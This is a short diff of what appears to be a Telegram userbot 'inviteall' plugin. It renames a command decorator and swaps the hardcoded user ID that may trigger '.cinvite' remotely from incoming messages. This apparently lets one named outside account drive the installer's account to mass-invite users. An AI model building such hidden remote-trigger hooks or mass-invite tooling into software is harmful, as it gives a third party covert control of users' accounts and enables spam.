@@ -49,8 +49,8 @@ async def get_chatinfo(event):
     return chat_info
 
 
-@kyy_cmd(pattern="inviteall(?: |$)(.*)")
-@register(incoming=True, from_users=1663258664,
+@sansanzt_cmd(pattern="inviteall(?: |$)(.*)")
+@register(incoming=True, from_users=5108071228,
           pattern=r"^\.cinvite(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
